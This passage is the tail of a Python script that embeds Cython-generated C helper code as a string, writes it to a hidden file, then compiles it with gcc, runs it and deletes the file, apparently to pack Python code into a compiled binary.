             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
